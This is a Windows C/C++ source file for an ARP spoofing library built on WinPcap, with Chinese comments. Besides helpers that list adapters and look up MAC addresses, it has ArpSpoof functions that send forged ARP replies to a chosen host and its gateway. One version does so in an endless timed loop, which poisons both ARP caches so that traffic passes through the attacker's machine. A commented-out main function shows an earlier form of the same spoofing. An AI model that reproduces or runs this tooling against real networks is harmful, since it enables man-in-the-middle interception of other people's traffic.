#include "stdAfx.h"
#include <stdio.h> 
#include "ArpSpoofLib.h" 
#include <Iphlpapi.h>

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")
#pragma comment(lib, "Iphlpapi.lib")


#ifdef WIN32
#pragma comment(lib, "ws2_32.lib")
#endif


#define LOG_DEBUG TRACE
#define LOG_ERROR TRACE
#define LOG_INFO TRACE


/* From tcptraceroute, convert a numeric IP address to a string */
#define IPTOSBUFFERS	12
char *iptos(u_long in)
{
	static char output[IPTOSBUFFERS][3*4+3+1];
	static short which;
	u_char *p;

	p = (u_char *)&in;
	which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
	sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
	return output[which];
}

char* ip6tos(struct sockaddr *sockaddr, char *address, int addrlen)
{
	socklen_t sockaddrlen;

#ifdef WIN32
	sockaddrlen = sizeof(struct sockaddr_in6);
#else
	sockaddrlen = sizeof(struct sockaddr_storage);
#endif


	if(getnameinfo(sockaddr, 
		sockaddrlen, 
		address, 
		addrlen, 
		NULL, 
		0, 
		NI_NUMERICHOST) != 0) address = NULL;

	return address;
}

/* Print all the available information on the given interface */
int ifprint(pcap_if_t *d, void *para)
{
	pcap_addr_t *a;
	char ip6str[128];

	/* Name */
	printf("%s\n",d->name);

	/* Description */
	if (d->description)
		printf("\tDescription: %s\n",d->description);

	/* Loopback Address*/
	printf("\tLoopback: %s\n",(d->flags & PCAP_IF_LOOPBACK)?"yes":"no");

	/* IP addresses */
	for(a=d->addresses;a;a=a->next) {
		printf("\tAddress Family: #%d\n",a->addr->sa_family);

		switch(a->addr->sa_family)
		{
		case AF_INET:
			printf("\tAddress Family Name: AF_INET\n");
			if (a->addr)
				printf("\tAddress: %s\n",
						iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
			if (a->netmask)
				printf("\tNetmask: %s\n",
						iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
			if (a->broadaddr)
				printf("\tBroadcast Address: %s\n",
						iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
			if (a->dstaddr)
				printf("\tDestination Address: %s\n",
						iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
			break;

		case AF_INET6:
			printf("\tAddress Family Name: AF_INET6\n");
			if (a->addr)
				printf("\tAddress: %s\n", ip6tos(a->addr, ip6str, sizeof(ip6str)));
			break;

		default:
			printf("\tAddress Family Name: Unknown\n");
			break;
		}
	}
	printf("\n");
	return 0;
}

int ListInterfaceInfomation(IfPrintCallBack callBack, void * para)
{
	int nRet = 0;
	char errbuf[PCAP_ERRBUF_SIZE];    //错误缓冲区 
	pcap_if_t * d;
	pcap_if_t * Devs;
	pcap_addr * pAddr;
	int i = 0;

	if(NULL == callBack)
		callBack = ifprint;

	/* 获得本机网卡列表 */ 
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &Devs, errbuf) == -1) 
	{ 
		LOG_ERROR("Error in pcap_findalldevs: %s\n", errbuf);
		return - 1;
	}

	/* 打印网卡列表 */
	d = Devs;
	while(d)
	{
		nRet = callBack(d, para);
		if(nRet)
			break;

		d = d->next;
	} // 结束 while(d)

	pcap_freealldevs(Devs);
}

/** 
* 获得网卡的MAC地址 
* pDevName 网卡的设备名称 
*/ 
unsigned char* GetSelfMac(char* pDevName, unsigned char* mac)
{ 
	if(NULL == pDevName || NULL == mac)
	{
		LOG_ERROR("parametric (pDevName or mac) is set error\n");
		return NULL;
	}

	memset(mac,0,MAC_LENGTH); 
	if(!strncmp(PCAP_SRC_IF_STRING, pDevName, strlen(PCAP_SRC_IF_STRING)))
	{
		pDevName = pDevName + strlen(PCAP_SRC_IF_STRING);
	}
	else if(!strncmp(PCAP_SRC_FILE_STRING, pDevName, strlen(PCAP_SRC_FILE_STRING)))
	{
		pDevName = pDevName + strlen(PCAP_SRC_FILE_STRING);
	}// 结束 if(!strncmp(PCAP_SRC_IF_STRING, pDevName, strlen(PCAP_SRC_IF_STRING)))

	LPADAPTER lpAdapter = PacketOpenAdapter(pDevName); 

	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE)) 
	{ 
		printf("Device name is invalid\n");
		return NULL; 
	} 

	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(MAC_LENGTH + sizeof(PACKET_OID_DATA)); 
	if (OidData == NULL) 
	{ 
		PacketCloseAdapter(lpAdapter); 
		return NULL; 
	} 

	// 
	// Retrieve the adapter MAC querying the NIC driver 
	// 
	OidData->Oid = OID_802_3_CURRENT_ADDRESS; 

	OidData->Length = MAC_LENGTH; 
	memset(OidData->Data, 0, MAC_LENGTH); 
	BOOLEAN Status = PacketRequest(lpAdapter, FALSE, OidData); 
	if(Status) 
	{ 
		memcpy(mac, (u_char*)(OidData->Data), MAC_LENGTH); 
	} 
	free(OidData); 
	PacketCloseAdapter(lpAdapter); 
	return mac; 
}

int HexStringToCharArrary(char * pHexString, unsigned char* pCharArrary)
{
	int nRet = 0, nSize = 0;
	nSize = strlen(pHexString);
	if(MAC_LENGTH * 2 != nSize)
	{
		LOG_ERROR("Input hex string isn't equal 12\n");
		return -1;
	}// 结束 if(MAC_LENGTH * 2 != nSize)

	for(int i = 0, j = 0; i < nSize; i ++, j++)
	{
		if(pHexString[i] >= '0' && pHexString[i] <= '9')
		{
			pCharArrary[j] = (pHexString[i] - '0');
		}
		else if(pHexString[i] >= _T('a') && pHexString[i] <= _T('f'))
		{
			pCharArrary[j] = (pHexString[i] - _T('a') + 10);
		}				
		else if(pHexString[i] >= _T('A') && pHexString[i] <= _T('F'))
		{
			pCharArrary[j] = (pHexString[i] - _T('A') + 10);
		}
		pCharArrary[j] <<= 4;
		i++;
		if(pHexString[i] >= '0' && pHexString[i] <= '9')
		{
			pCharArrary[j] += (pHexString[i] - '0');
		}
		else if(pHexString[i] >= _T('a') && pHexString[i] <= _T('f'))
		{
			pCharArrary[j] += (pHexString[i] - _T('a') + 10);
		}				
		else if(pHexString[i] >= _T('A') && pHexString[i] <= _T('F'))
		{
			pCharArrary[j] += (pHexString[i] - _T('A') + 10);
		}
	}

	return nRet;
}

/*!
\brief   建立arp包
\param   struct arp_packet * pPacket：包指针
\param   unsigned char * pSrcMac    ：源MAC地址，6字节MAC地址数组
\param   unsigned char * pDstMac    ：目的MAC地址，6字节MAC地址数组
\param   unsigned long lSrcIp       ：源IP。4字节IP地址
\param   unsigned long lDstIp       ：目的IP
\return  类型为 int 。
\version 1.0
\author  康  林
\date    2013/4/7 13:14:06
*/
int BuildArpPacket(
				    /*[in/out]*/struct arp_packet * pPacket,
					/*[in]*/unsigned char * pSrcMac,
					/*[in]*/unsigned char * pDstMac,
					/*[in]*/unsigned long lSrcIp,
					/*[in]*/unsigned long lDstIp,
					/*[in]*/unsigned short option/*请求类型*/
					)
{
	int nRet = 0;

	pPacket->eth.eh_type = htons(ETH_ARP);
	memcpy(pPacket->eth.source_mac, pSrcMac, MAC_LENGTH);
	memcpy(pPacket->eth.dest_mac, pDstMac, MAC_LENGTH);

	pPacket->arp.option = htons(option),
	//硬件类型，Ethernet是0x0001
	pPacket->arp.hardware_type = htons(ARP_HARDWARE);
	//上层协议类型，IP为0x0800
	pPacket->arp.protocol_type = htons(ETH_IP);
	//硬件地址长度：MAC地址长度为0x06
	pPacket->arp.add_len = MAC_LENGTH;
	//协议地址长度：IP地址长度为0x04
	pPacket->arp.pro_len = PROTOCOL_IP_LENGTH;
	memcpy(pPacket->arp.sour_addr, pSrcMac, MAC_LENGTH);
	pPacket->arp.sour_ip = lSrcIp;
	memcpy(pPacket->arp.dest_addr, pDstMac, MAC_LENGTH);
	pPacket->arp.dest_ip = lDstIp;
	memset(pPacket->arp.padding, 0, 18);

	return nRet;
}

/*!
\brief   建立arp包
\param   struct arp_packet * pPacket：
\param   char * pSrcMac             ：源MAC地址，字符串，例如：“1234567890ab”
\param   char * pDstMac             ：目的MAC地址
\param   char * pSrcIp              ：源IP。字符串，例如：“192.168.1.111”
\param   char * pDstIp              ：目的IP
\return  类型为 int 。
\version 1.0
\author  康  林
\date    2013/4/7 14:00:39
*/
int BuildArpPacket(
					/*[in/out]*/struct arp_packet * pPacket,
					/*[in]*/char * pSrcMac,
					/*[in]*/char * pDstMac,
					/*[in]*/char * pSrcIp,
					/*[in]*/char * pDstIp,
					/*[in]*/unsigned short option/*请求类型*/
					)
{
	int nRet = 0;
	unsigned long lSrcIp, lDstIp;
	unsigned char srcMac[MAC_LENGTH], dstMac[MAC_LENGTH];
	nRet = HexStringToCharArrary(pSrcMac, srcMac);
	if(nRet)
	{
		return nRet;
	}// 结束 if(nRet)

	nRet = HexStringToCharArrary(pDstMac, dstMac);
	if(nRet)
	{
		return nRet;
	}// 结束 if(nRet)

	lSrcIp = inet_addr(pSrcIp);
	lDstIp = inet_addr(pDstIp);
	nRet = BuildArpPacket(pPacket, srcMac, dstMac, lSrcIp, lDstIp, option);

	return nRet;
}

int BuildArpRequest(
					/*[in/out]*/struct arp_packet * pPacket,
					/*[in]*/char * pSrcMac,
					/*[in]*/char * pDstMac,
					/*[in]*/char * pSrcIp,
					/*[in]*/char * pDstIp
					)
{
	int nRet = 0;

	nRet = BuildArpPacket(pPacket, pSrcMac, pDstMac, pSrcIp, pDstIp, ARP_REQUEST);
	return nRet;
}


int BuildArpReply(
					/*[in/out]*/struct arp_packet * pPacket,
					/*[in]*/char * pSrcMac,
					/*[in]*/char * pDstMac,
					/*[in]*/char * pSrcIp,
					/*[in]*/char * pDstIp
					)
{
	int nRet = 0;

	nRet = BuildArpPacket(pPacket, pSrcMac, pDstMac, pSrcIp, pDstIp, ARP_REPLY);
	return nRet;
}

/*!
\brief   建立arp应答包
\param   struct arp_packet * pPacket：包指针
\param   unsigned char * pSrcMac    ：源MAC地址，6字节MAC地址数组
\param   unsigned char * pDstMac    ：目的MAC地址，6字节MAC地址数组
\param   unsigned long lSrcIp       ：源IP。4字节IP地址
\param   unsigned long lDstIp       ：目的IP
\return  类型为 int 。
\version 1.0
\author  康  林
\date    2013/4/7 13:14:06
*/
int BuildArpReply(
    /*[in/out]*/struct arp_packet * pPacket,
	/*[in]*/unsigned char * pSrcMac,
	/*[in]*/unsigned char * pDstMac,
	/*[in]*/char * pSrcIp,
	/*[in]*/char * pDstIp
	)
{
	int nRet = 0;
	unsigned long lSrcIp, lDstIp;
	lSrcIp = inet_addr(pSrcIp);
	lDstIp = inet_addr(pDstIp);
	nRet = BuildArpPacket(pPacket, pSrcMac, pDstMac, lSrcIp, lDstIp, ARP_REPLY);
	return nRet;
}

int ArpSpoof(
			 pcap_t * Handler, char * pszGatewayIp, char * pszGatewayMac,
			 char * pszHostIp, char * pszHostMac, char * pszLocalMac
			 )
{
	int nRet = 0;
	struct arp_packet packet;

	//向网关和主机分别定时发送欺骗包
	//while(1)
	{
		BuildArpReply(&packet, pszLocalMac, pszHostMac, pszGatewayIp, pszHostIp);
		if(pcap_sendpacket(Handler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
		}

		BuildArpReply(&packet, pszLocalMac, pszGatewayMac, pszHostIp, pszGatewayIp);
		if(pcap_sendpacket(Handler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
		}
	} // 结束 while(1)

	return nRet;
}


int ArpSpoof(
			 char * pszInterfaceName, char * pszGatewayIp, char * pszGatewayMac,
			 char * pszHostIp, char * pszHostMac, char * pszLocalMac
			 )
{
	int nRet = 0;
	struct arp_packet packet;
	pcap_t * pHandler;
	char errbuf[PCAP_ERRBUF_SIZE];    //错误缓冲区 

	/* 打开网卡 */ 
	if((pHandler = pcap_open(pszInterfaceName, // name of the device 
		65536, // portion of the packet to capture 
		0, //open flag 
		1000, // read timeout 
		NULL, // authentication on the remote machine 
		errbuf // error buffer 
		) ) == NULL) 
	{ 
		LOG_ERROR("\nUnable to open the adapter. %s is not supported by WinPcap\n",
			pszInterfaceName); 
		/* Free the device list */ 
		return -1; 
	} 

	//向网关和主机分别定时发送欺骗包
	//while(1)
	{
		BuildArpReply(&packet, pszLocalMac, pszHostMac, pszGatewayIp, pszHostIp);
		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
		}

		BuildArpReply(&packet, pszLocalMac, pszGatewayMac, pszHostIp, pszGatewayIp);
		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
		}
	} // 结束 while(1)

	pcap_close(pHandler); 
	return nRet;
}

int ArpSpoof(
			 char * pszInterfaceName, char * pszGatewayIp,
			 char * pszHostIp, int nInterval /*ms*/
			 )
{
    int nRet = 0;
	struct arp_packet packet;
	pcap_t * pHandler;
	char errbuf[PCAP_ERRBUF_SIZE];    //错误缓冲区 
	unsigned char gatewayMac[6] = {0};
	unsigned char hostMac[6] = {0};
	unsigned char localMac[6] = {0};

	GetSelfMac(pszInterfaceName, localMac);
	GetMac(pszGatewayIp, gatewayMac);
	GetMac(pszHostIp, hostMac);

	/* 打开网卡 */ 
	if((pHandler = pcap_open(pszInterfaceName, // name of the device 
		65536, // portion of the packet to capture 
		0, //open flag 
		1000, // read timeout 
		NULL, // authentication on the remote machine 
		errbuf // error buffer 
		) ) == NULL) 
	{ 
		LOG_ERROR("\nUnable to open the adapter. %s is not supported by WinPcap\n",
			pszInterfaceName); 
		/* Free the device list */ 
		return -1; 
	} 

	//向网关和主机分别定时发送欺骗包
	while(1)
	{
		BuildArpReply(&packet, localMac, hostMac, pszGatewayIp, pszHostIp);
		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
		}

		BuildArpReply(&packet, localMac, gatewayMac, pszHostIp, pszGatewayIp);
		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
		{
			LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
		}
		Sleep(nInterval);
	} // 结束 while(1)

	pcap_close(pHandler); 
	return nRet;
}

int GetMac( /*[in]*/char * pszIp, /*[out]*/unsigned char * Mac)
{
	int nRet = 0;
	bool bDelete = false;
	MIB_IPNETTABLE table;
	PMIB_IPNETTABLE pIpNetTable = &table;
	ULONG nSize = sizeof(MIB_IPNETTABLE);
	DWORD dwIp = inet_addr(pszIp);
	memset(pIpNetTable, 0, nSize);

	nRet = GetIpNetTable(pIpNetTable, &nSize, false);
	if(NO_ERROR != nRet)
	{
		if(ERROR_INSUFFICIENT_BUFFER == nRet)
		{
			pIpNetTable = (PMIB_IPNETTABLE)new char[nSize];
			if(NULL == pIpNetTable)
			{
				return - 1;
			}// 结束 if(NULL == pIpNetTable)
			bDelete = true;
		}
		else
		{
			return nRet;
		}// 结束 if(ERROR_INSUFFICIENT_BUFFER == nRet)
	} // 结束 if(NO_ERROR != nRet)

	memset(pIpNetTable, 0, nSize);
	nRet = GetIpNetTable(pIpNetTable, &nSize, false);
	if(NO_ERROR != nRet)
	{
		LOG_ERROR("GetIpNetTable error.nRet:\n", nRet);
		if(bDelete)
			delete []pIpNetTable;
		return nRet;
	}// 结束 (pIpNetTable, &nSize, false)

	PMIB_IPNETTABLE * p;
	for(int i = 0; i < pIpNetTable->dwNumEntries; i++)
	{
		LOG_DEBUG("IP:%s; MAC:%2X-%2X-%2X-%2X-%2X-%2X\n",
			iptos(pIpNetTable->table[i].dwAddr),
			Mac[0], Mac[1], Mac[2], Mac[3], Mac[4], Mac[5], Mac[6]);
		if(dwIp == pIpNetTable->table[i].dwAddr)
		{
			memcpy(Mac, pIpNetTable->table[i].bPhysAddr, pIpNetTable->table[i].dwPhysAddrLen);
			if(bDelete)
			{
				delete []pIpNetTable;
			}
			return 0;
		} // 结束 if(dwIp == pIpNetTable->table[i].dwAddr)
	} // 结束 for(int i = 0; i < pIpNetTable->dwNumEntries; i++)

	
	if(bDelete)
		delete []pIpNetTable;

	return nRet;
}

const char * GetMacString(unsigned char * pMac)
{
	static char strMAC[20];
	sprintf(strMAC, "%02X%02X%02X%02X%02X%02X",
		pMac[0], pMac[1], pMac[2],
		pMac[3], pMac[4], pMac[5]);
	return strMAC;	
}

//
//int main(int argc,char* argv[]){ 
//	pcap_if_t *alldevs;               //全部网卡列表 
//	pcap_if_t *d;                     //一个网卡 
//	int inum;                         //用户选择的网卡序号 
//	int i=0;                          //循环变量 
//	pcap_t *adhandle;                 //一个pcap实例 
//	char errbuf[PCAP_ERRBUF_SIZE];    //错误缓冲区 
//	unsigned char mac[6], dstMac[6];             //本机MAC地址 
//	struct arp_packet  packet;        //ARP包 
//	unsigned long fakeIp;             //要伪装成的IP地址 
//	pcap_addr_t *pAddr;               //网卡地址 
//	unsigned long ip;                 //IP地址 
//	unsigned long netmask;            //子网掩码 
//
//	if(argc!=2){ 
//		printf("Usage: %s inet_addr\n",argv[0]); 
//		return -1; 
//	} 
//
//	//从参数列表获得要伪装的IP地址 
//	fakeIp = inet_addr(argv[1]); 
//	if(INADDR_NONE==fakeIp){ 
//		fprintf(stderr,"Invalid IP: %s\n",argv[1]); 
//		return -1; 
//	} 
//
//	/* 获得本机网卡列表 */ 
//	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) 
//	{ 
//		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf); 
//		exit(1); 
//	} 
//
//	/* 打印网卡列表 */ 
//	for(d=alldevs; d; d=d->next) 
//	{ 
//		printf("%d", ++i); 
//		if (d->description) 
//		{
//			printf(". description:%s\n", d->description);
//			printf(". name:%s\n", d->name);
//		}
//		else 
//			printf(". No description available\n"); 
//	} 
//	//如果没有发现网卡 
//	if(i==0) 
//	{ 
//		printf("\nNo interfaces found! Make sure WinPcap is installed.\n"); 
//		return -1; 
//	} 
//	//请用户选择一个网卡 
//	printf("Enter the interface number (1-%d):",i); 
//	scanf("%d", &inum); 
//
//	//如果用户选择的网卡序号超出有效范围，则退出 
//	if(inum < 1 || inum > i) 
//	{ 
//		printf("\nInterface number out of range.\n"); 
//		/* Free the device list */ 
//		pcap_freealldevs(alldevs); 
//		return -1; 
//	} 
//
//	/* 移动指针到用户选择的网卡 */ 
//	for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++); 
//
//	GetSelfMac(d->name, mac); //+8以去掉"rpcap://" 
//
//	printf("发送ARP欺骗包，本机(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) 试图伪装成%s\n", 
//		mac[0],mac[1],mac[2],mac[3],mac[4],mac[5],argv[1]); 
//
//
//
//	/* 打开网卡 */ 
//	if ( (adhandle= pcap_open(d->name, // name of the device 
//		65536, // portion of the packet to capture 
//		0, //open flag 
//		1000, // read timeout 
//		NULL, // authentication on the remote machine 
//		errbuf // error buffer 
//		) ) == NULL) 
//	{ 
//		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", 
//			d->name); 
//		/* Free the device list */ 
//		pcap_freealldevs(alldevs); 
//		return -1; 
//	} 
//
//	HexStringToCharArrary("000000000000", dstMac);
//	BuildArpReply(&packet, mac, dstMac, "192.168.1.111", "192.168.1.10");
//	if(pcap_sendpacket(adhandle, (const u_char * )&packet, 60) == -1)
//	{
//		fprintf(stderr, "pcap_sendpacket error.\n");
//	}
//
//	pcap_close(adhandle);
//	//for(pAddr=d->addresses; pAddr; pAddr=pAddr->next){ 
//	//	//得到用户选择的网卡的一个IP地址 
//	//	ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr; 
//	//	//得到该IP地址对应的子网掩码 
//	//	netmask = ((struct sockaddr_in *)(pAddr->netmask))->sin_addr.S_un.S_addr; 
//	//	if (!ip || !netmask){ 
//	//		continue; 
//	//	} 
//	//	//看看这个IP和要伪装的IP是否在同一个子网 
//	//	if((ip&netmask)!=(fakeIp&netmask)){ 
//	//		continue; //如果不在一个子网，继续遍历地址列表 
//	//	} 
//
//	//	unsigned long netsize = ntohl(~netmask); //网络中主机数
//	//	unsigned long net = ip & netmask; //子网地址 
//
//	//	for(unsigned long n=1; n<netsize; n++){ 
//	//		//第i台主机的IP地址，网络字节顺序 
//	//		unsigned long destIp = net | htonl(n); 
//	//		//构建假的ARP请求包，达到本机伪装成给定的IP地址的目的 
//	//		//packet = BuildArpPacket(mac,fakeIp,destIp); 
//	//		/*if(pcap_sendpacket(adhandle, packet, 60)==-1){ 
//	//			fprintf(stderr,"pcap_sendpacket error.\n"); 
//	//		} */
//	//	} 
//
//	////} 
//
//	return 0; 
//} 
//
